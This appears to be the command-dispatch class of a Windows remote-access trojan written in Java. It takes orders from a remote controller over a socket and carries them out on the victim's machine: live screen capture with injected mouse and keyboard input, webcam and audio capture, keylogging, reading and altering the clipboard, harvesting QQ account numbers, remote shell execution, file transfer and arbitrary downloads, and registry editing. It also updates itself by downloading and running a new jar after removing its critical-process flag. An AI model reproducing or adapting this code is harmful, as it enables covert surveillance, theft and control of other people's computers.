package me.client.utils;

import com.sun.jna.NativeLong;
import com.sun.jna.Pointer;
import com.sun.jna.WString;
import com.sun.jna.platform.win32.Kernel32;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import me.client.Client;
import me.client.send.*;
import oshi.jna.platform.windows.WinNT;

import javax.swing.*;
import java.awt.*;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.net.Socket;
import java.net.URI;
import java.net.URL;

import static com.sun.jna.platform.win32.WinUser.*;

public class ReceiveMessage extends Thread{
    public static final Object lock = new Object();
    private final static int MB_SYSTEMMODAL = 0x00001000;
    private final static int MB_TOPMOST = 0x00040000;
    private final static int MB_OK = 0x00000000;
    private final static int MB_YESNOCANCEL = 0x00000003;
    private final static int MB_YESNO = 0x00000004;
    private final static int MB_ICONHAND = 0x00000010;
    private final static int MB_ICONQUESTION = 0x00000020;
    private final static int MB_ICONASTERISK = 0x00000040;
    private final static int MB_ICONEXCLAMATION = 0x00000030;
    int remoteChatCount = 0;
    int audioCount = 0;
    int fileCount = 0;
    int cmdCount = 0;
    int screenCount = 0;
    int regCount = 0;
    int systemCount = 0;
    int webCamCount = 0;
    int keyBoardCount = 0;

    Socket socket;
    File file;
    Audio audio;
    SendScreen sendScreen;
    FileDownload fileDownload;
    SystemManager sendTaskList;
    WebCam listen;
    RemoteChat chat;
    RemoteCmd remoteCmd;
    FileManager fileManage;
    SendQQNumber sendQQNumber;
    FlashBomb flashBomb;
    SetClipboard setClipboard;
    KeyBoardHook keyBoardHook;
    RegisterManager registerManager;
    PictureDisplay pictureDisplay;
    LANAccess lanAccess;
    FileOutputStream fileOutputStream;
    FileOutputStream fileUpdate;

    public ReceiveMessage(Socket socket) throws Exception{
        this.socket = socket;
    }
    @Override
    public void run() {
        try {
            while (true) {
                DataInputStream dataInputStream = new DataInputStream(socket.getInputStream());
                    Thread.sleep(1);
                    byte[] head = SendMessage.receiveHead(dataInputStream);
                    int lens;
                    byte[] context;
                    switch (head[0]) {
                        case MessageFlags.HEARTPACK:
                            //心跳包
                            break;
                        case MessageFlags.SHOW_SCREEN:
                            if(screenCount == 0) {
                                sendScreen = new SendScreen(socket);
                                sendScreen.run = true;
                                sendScreen.start();
                                screenCount++;
                            }else {
                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                            }
                            break;
                        case MessageFlags.STOP_SCREEN:
                            sendScreen.run = false;
                            screenCount--;
                            break;
                        case MessageFlags.SHOW_TASKLIST:
                            if(systemCount == 0) {
                                sendTaskList = new SystemManager(socket);
                                sendTaskList.showTaskList();
                                sendTaskList.updateTaskList();
                                systemCount++;
                            }else {
                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                            }
                            break;
                        case MessageFlags.UPDATE_TASKLIST:
                            sendTaskList = new SystemManager(socket);
                            sendTaskList.updateTaskList();
                            break;
                            case MessageFlags.CLOSE_TASKLIST:
                                systemCount--;
                                break;
                        case MessageFlags.STOP_PROCESS:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String PIDstr = new String(context);
                            SystemManager.stopProcess(Integer.parseInt(PIDstr));
                            break;
                        case MessageFlags.UPDATE_SYSTEMINFO:
                            sendTaskList.sendSystemInfo();
                            break;
                        case MessageFlags.SHOW_CAMERA:
                            if(webCamCount == 0) {
                                listen = new WebCam(socket);
                                listen.run = true;
                                listen.start();
                                webCamCount++;
                            }else {
                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                            }
                            break;
                        case MessageFlags.STOP_CAMERA:
                            listen.closeCamera();
                            webCamCount--;
                            break;
                        case MessageFlags.SHOW_REMOTECHAT:
                            if(remoteChatCount == 0) {
                                chat = new RemoteChat(socket);
                                remoteChatCount++;
                            }else {
                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                            }
                            break;
                        case MessageFlags.SEND_REMOTECHAT:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            chat.update(context);
                            break;
                        case MessageFlags.STOP_REMOTECHAT:
                            chat.closeWindows();
                            remoteChatCount--;
                            break;
                        case MessageFlags.MESSAGEBOX_ERROR_YNC:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str = new String(context);
                                    String title = str.substring(str.indexOf("Title:") + 6,str.indexOf("Context:"));
                                    String mainContext = str.substring(str.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext),new WString(title),MB_SYSTEMMODAL|MB_TOPMOST|MB_YESNOCANCEL|MB_ICONHAND);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_INFORMATION_YNC:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str1 = new String(context);
                                    String title1 = str1.substring(str1.indexOf("Title:") + 6,str1.indexOf("Context:"));
                                    String mainContext1 = str1.substring(str1.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext1),new WString(title1),MB_SYSTEMMODAL|MB_TOPMOST|MB_YESNOCANCEL|MB_ICONASTERISK);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_WARNING_YNC:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str2 = new String(context);
                                    String title2 = str2.substring(str2.indexOf("Title:") + 6,str2.indexOf("Context:"));
                                    String mainContext2 = str2.substring(str2.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext2),new WString(title2),MB_SYSTEMMODAL|MB_TOPMOST|MB_YESNOCANCEL|MB_ICONEXCLAMATION);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_QUESTION_YNC:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str3 = new String(context);
                                    String title3 = str3.substring(str3.indexOf("Title:") + 6,str3.indexOf("Context:"));
                                    String mainContext3 = str3.substring(str3.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext3),new WString(title3),MB_SYSTEMMODAL|MB_TOPMOST|MB_YESNOCANCEL|MB_ICONQUESTION);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_ERROR_YN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str4 = new String(context);
                                    String title4 = str4.substring(str4.indexOf("Title:") + 6,str4.indexOf("Context:"));
                                    String mainContext4 = str4.substring(str4.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext4),new WString(title4),MB_SYSTEMMODAL|MB_TOPMOST|MB_YESNO|MB_ICONHAND);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_INFORMATION_YN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str5 = new String(context);
                                    String title5 = str5.substring(str5.indexOf("Title:") + 6,str5.indexOf("Context:"));
                                    String mainContext5 = str5.substring(str5.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext5),new WString(title5),MB_SYSTEMMODAL|MB_TOPMOST|MB_YESNO|MB_ICONASTERISK);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_WARNING_YN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str6 = new String(context);
                                    String title6 = str6.substring(str6.indexOf("Title:") + 6,str6.indexOf("Context:"));
                                    String mainContext6 = str6.substring(str6.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext6),new WString(title6),MB_SYSTEMMODAL|MB_TOPMOST|MB_YESNO|MB_ICONEXCLAMATION);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_QUESTION_YN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str7 = new String(context);
                                    String title7 = str7.substring(str7.indexOf("Title:") + 6,str7.indexOf("Context:"));
                                    String mainContext7 = str7.substring(str7.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext7),new WString(title7),MB_SYSTEMMODAL|MB_TOPMOST|MB_YESNO|MB_ICONQUESTION);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_ERROR_Y:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str8 = new String(context);
                                    String title8 = str8.substring(str8.indexOf("Title:") + 6,str8.indexOf("Context:"));
                                    String mainContext8 = str8.substring(str8.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext8),new WString(title8),MB_SYSTEMMODAL|MB_TOPMOST|MB_OK|MB_ICONHAND);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_INFORMATION_Y:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str9 = new String(context);
                                    String title9 = str9.substring(str9.indexOf("Title:") + 6,str9.indexOf("Context:"));
                                    String mainContext9 = str9.substring(str9.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext9),new WString(title9),MB_SYSTEMMODAL|MB_TOPMOST|MB_OK|MB_ICONASTERISK);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_WARNING_Y:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str10 = new String(context);
                                    String title10 = str10.substring(str10.indexOf("Title:") + 6,str10.indexOf("Context:"));
                                    String mainContext10 = str10.substring(str10.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext10),new WString(title10),MB_SYSTEMMODAL|MB_TOPMOST|MB_OK|MB_ICONEXCLAMATION);
                                }
                            }).start();
                            break;
                        case MessageFlags.MESSAGEBOX_QUESTION_Y:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new Runnable() {
                                @Override
                                public void run() {
                                    String str11 = new String(context);
                                    String title11 = str11.substring(str11.indexOf("Title:") + 6,str11.indexOf("Context:"));
                                    String mainContext11 = str11.substring(str11.indexOf("Context:") + 8);
                                    LoadUser32.instance.MessageBoxW(null,new WString(mainContext11),new WString(title11),MB_SYSTEMMODAL|MB_TOPMOST|MB_OK|MB_ICONQUESTION);
                                }
                            }).start();
                            break;
                        case MessageFlags.SHOW_REMOTE_CMD:
                            if(cmdCount == 0) {
                                remoteCmd = new RemoteCmd(socket);
                                SendMessage.SendHead(MessageFlags.SHOW_REMOTE_CMD, socket);
                                cmdCount++;
                            }else {
                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                            }
                            break;
                        case MessageFlags.EXECUTE_REMOTE_CMD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            remoteCmd.cmdExecute(context);
                            break;
                            case MessageFlags.CLOSE_REMOTE_CMD:
                                cmdCount--;
                                break;
                        case MessageFlags.SHOW_FILEWINDOW:
                            if(fileCount == 0) {
                                fileManage = new FileManager(socket);
                                SendMessage.SendHead(MessageFlags.SHOW_FILEWINDOW, socket);
                                fileCount++;
                            }else {
                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                            }
                            break;
                        case MessageFlags.FILE_QUERY:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileManage.FileQuery(new String(context));
                            break;
                        case MessageFlags.FILE_OPEN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileManage.OpenFile(new String(context));
                            break;
                        case MessageFlags.FILE_DELETE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileManage.DeleteFile(new String(context));
                            break;
                        case MessageFlags.FILE_CREATEWITHNAME:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            file = new File(new String(context));
                            file.createNewFile();
                            break;
                        case MessageFlags.FILE_PREPARE:
                            fileOutputStream = new FileOutputStream(file);
                            break;
                        case MessageFlags.FILE_UPLOAD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            try{
                                context = SendMessage.receiveContext(dataInputStream, lens);
                                fileOutputStream.write(context);
                            } catch (Exception e) {
                            }
                            break;
                        case MessageFlags.FILE_UPLOAD_END:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileOutputStream.close();
                            SendMessage.Send(MessageFlags.FILE_UPLOAD_OK,context,socket);
                            break;
                        case MessageFlags.FILE_DOWNLOAD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            new Thread(new FileDownload(socket,new String(context))).start();
                            break;
                        case MessageFlags.FILE_HTTPDOWNLOAD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String strings = new String(context);
                            String[] pathAndUrl = strings.split("-path");
                            HttpDownload.download(pathAndUrl[0], new URL(pathAndUrl[1]));
                            break;
                        case MessageFlags.FILE_CREATE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            File file1 = new File(new String(context));
                            file1.createNewFile();
                            break;
                            case MessageFlags.CLOSE_FILE_MANAGER:
                                fileCount--;
                                break;
                        case MessageFlags.SHOW_QQNUMBERWINDOW:
                            sendQQNumber = new SendQQNumber(socket);
                            sendQQNumber.SendQQNumbers();
                            break;
                        case MessageFlags.WEB_BROWSE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            Desktop desktop = Desktop.getDesktop();
                            if (desktop.isSupported(Desktop.Action.BROWSE)) {
                                desktop.browse(new URI(new String(context)));
                            }
                            break;
                        case MessageFlags.FLASH_SCREEN:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            flashBomb = new FlashBomb(new String(context));
                            break;
                        case MessageFlags.BUZZER:
                            LoadKernel32.instance.Beep(new DWORD(1200),new DWORD(1200));
                            break;
                        case MessageFlags.SHOW_CLIPBORADWINDOW:
                            setClipboard = new SetClipboard(socket);
                            SendMessage.SendHead(MessageFlags.SHOW_CLIPBORADWINDOW, socket);
                            break;
                        case MessageFlags.GET_CLIPBORAD:
                            setClipboard.getClipboard();
                            break;
                        case MessageFlags.CHANGE_CLIPBORAD:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            setClipboard.setClipboard(new String(context));
                            break;
                        case MessageFlags.SHOW_KEYBORADWINDOW:
                            if(keyBoardCount == 0) {
                                SendMessage.SendHead(MessageFlags.SHOW_KEYBORADWINDOW, socket);
                                keyBoardHook = new KeyBoardHook(socket);
                                keyBoardHook.run = true;
                                keyBoardHook.start();
                                keyBoardCount++;
                            }else {
                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                            }
                            break;
                        case MessageFlags.CLOSE_KEYBORAD:
                            keyBoardHook.run = false;
                            keyBoardHook.setHookOff();
                            keyBoardCount--;
                            break;
                        case MessageFlags.ENUM_WINDOWS:
                            sendTaskList.enumWindows();
                            break;
                        case MessageFlags.CLOSE_WINDOW:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String h= new String(context);
                            WinDef.HWND hwnd = new WinDef.HWND(new Pointer(Integer.parseInt(h)));
                            User32.INSTANCE.PostMessage(hwnd,WM_CLOSE,null,null);
                            break;
                        case MessageFlags.HIDE_WINDOW:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String str12 = new String(context);
                            WinDef.HWND hwnd1 = new WinDef.HWND(new Pointer(Integer.parseInt(str12)));
                            User32.INSTANCE.CloseWindow(hwnd1);
                            break;
                        case MessageFlags.SHOW_WINDOW:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String str13 = new String(context);
                            WinDef.HWND hwnd2 = new WinDef.HWND(new Pointer(Integer.parseInt(str13)));
                            User32.INSTANCE.ShowWindow(hwnd2, SW_SHOWMAXIMIZED);
                            break;
                        case MessageFlags.DISK_QUERT:
                            fileManage.DiskQuery();
                            break;
                        case MessageFlags.RELIEVE:
                            Client.relieve();
                            break;
                        case MessageFlags.KEY_PRESSED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s = new String(context);
                            sendScreen.KeyPress(s);
                            break;
                        case MessageFlags.KEY_RELEASED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s1 = new String(context);
                            sendScreen.KeyReleased(s1);
                            break;
                        case MessageFlags.MOUSE_PRESSED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s2 = new String(context);
                            sendScreen.MousePress(s2);
                            break;
                        case MessageFlags.MOUSE_RELEASED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s3 = new String(context);
                            sendScreen.MouseReleased(s3);
                            break;
                        case MessageFlags.MOUSE_MOVED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s4 = new String(context);
                            sendScreen.MouseMove(s4);
                            break;
                        case MessageFlags.MOUSE_DRAGGED:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s5 = new String(context);
                            sendScreen.MouseDragged(s5);
                            break;
                            case MessageFlags.MOUSE_WHEEL:
                                lens = SendMessage.receiveLength(dataInputStream);
                                context = SendMessage.receiveContext(dataInputStream, lens);
                                String s6 = new String(context);
                                sendScreen.MouseWheel(s6);
                                break;
                        case MessageFlags.UPDATE:
                            LoadDLL.instance.RemoveProcessIsCritical();
                            File file = new File(Client.getWindowsPath1() + "\\new.jar");
                            file.createNewFile();
                            break;
                        case MessageFlags.UPDATE_PREPARE:
                            fileUpdate = new FileOutputStream(Client.getWindowsPath1() + "\\new.jar");
                            break;
                        case MessageFlags.UPDATE_FILE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            fileUpdate.write(context);
                            break;
                        case MessageFlags.UPDATE_FILE_END:
                            fileUpdate.close();
                            Runtime.getRuntime().exec("java -jar " + Client.getWindowsPath1() + "\\new.jar " + Kernel32.INSTANCE.GetCurrentProcessId());
                            SendMessage.SendHead(MessageFlags.UPDATE,socket);
                            break;
                        case MessageFlags.REGIDTER_WINDOWS_SHOW:
                            if(regCount == 0) {
                                registerManager = new RegisterManager(socket);
                                SendMessage.SendHead(MessageFlags.REGIDTER_WINDOWS_SHOW, socket);
                                regCount++;
                            }else {
                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                            }
                            break;
                        case MessageFlags.REGIDTER_QUERY_ROOT_KEY:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            registerManager.regQuery(Integer.parseInt(new String(context)),"");
                            break;
                        case MessageFlags.REGIDTER_QUERY_KEY:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String str = new String(context);
                            registerManager.regQuery(Integer.parseInt(str.substring(0,str.indexOf(":"))),str.substring(str.indexOf(":") + 1));
                            break;
                        case MessageFlags.REGIDTER_SET_VALUE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String[] strings1 = new String(context).split("!");
                            registerManager.setValue(Integer.parseInt(strings1[0]),strings1[1],strings1[2],strings1[4],strings1[3]);
                            break;
                        case MessageFlags.REGIDTER_DELETE_VALUE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String[] strings2 = new String(context).split("!");
                            registerManager.deleteValue(Integer.parseInt(strings2[0]),strings2[1],strings2[2]);
                            break;
                        case MessageFlags.REGIDTER_CREATE_VALUE:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String[] strings3 = new String(context).split("!");
                            registerManager.createValue(Integer.parseInt(strings3[0]),strings3[1],strings3[2],strings3[3]);
                            break;
                            case MessageFlags.CLOSE_REGIDTER:
                                regCount--;
                                break;
                         case MessageFlags.REGIDTER_CREATE_KEY:
                             lens = SendMessage.receiveLength(dataInputStream);
                             context = SendMessage.receiveContext(dataInputStream, lens);
                             String[] strings4 = new String(context).split("!");
                             registerManager.createKey(Integer.parseInt(strings4[0]),strings4[1],strings4[2]);
                                break;
                                case MessageFlags.REGIDTER_DELETE_KEY:
                                    lens = SendMessage.receiveLength(dataInputStream);
                                    context = SendMessage.receiveContext(dataInputStream, lens);
                                    String[] strings5 = new String(context).split("!");
                                    registerManager.deleteKey(Integer.parseInt(strings5[0]),strings5[1]);
                                    break;
                        case MessageFlags.AUDIO_WINDOWS_SHOW:
                            if(audioCount == 0) {
                                audio = new Audio(socket);
                                if(audio.open()) {
                                    audio.run = true;
                                    audio.start();
                                    audioCount++;
                                }else {
                                    SendMessage.SendHead(MessageFlags.AUDIO_ERROR,socket);
                                }
                            }else {
                                SendMessage.SendHead(MessageFlags.SHOW_WINDOW_ERROR,socket);
                            }
                            break;
                        case MessageFlags.AUDIO_CLOSE:
                            audio.close();
                            audioCount--;
                            break;
                            case MessageFlags.PICTURE_SHOW:
                                lens = SendMessage.receiveLength(dataInputStream);
                                context = SendMessage.receiveContext(dataInputStream, lens);
                                String url = new String(context);
                                pictureDisplay = new PictureDisplay();
                                pictureDisplay.show(url);
                                break;
                                case MessageFlags.PICTURE_CLOSE:
                                    pictureDisplay.close();
                                    break;
                        case MessageFlags.LAN_ACCESS_GET:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s7 = new String(context);
                            String urls = s7.substring(s7.indexOf("URL:") + 4,s7.indexOf("head:"));
                            String heads = s7.substring(s7.indexOf("head:") + 5,s7.indexOf("context:"));
                            lanAccess.get(urls,heads);
                            break;
                        case MessageFlags.LAN_ACCESS_POST:
                            lens = SendMessage.receiveLength(dataInputStream);
                            context = SendMessage.receiveContext(dataInputStream, lens);
                            String s8 = new String(context);
                            String urls1 = s8.substring(s8.indexOf("URL:") + 4,s8.indexOf("head:"));
                            String heads1 = s8.substring(s8.indexOf("head:") + 5,s8.indexOf("context:"));
                            String text = s8.substring(s8.indexOf("context:") + 8);
                            lanAccess.post(urls1,heads1,text);
                            break;
                        case MessageFlags.LAN_ACCESS_OPEN:
                            SendMessage.SendHead(MessageFlags.LAN_ACCESS_OPEN,socket);
                            lanAccess = new LANAccess(socket);
                            break;
                    }
            }
        }catch (Exception e) {
        }
    }
}
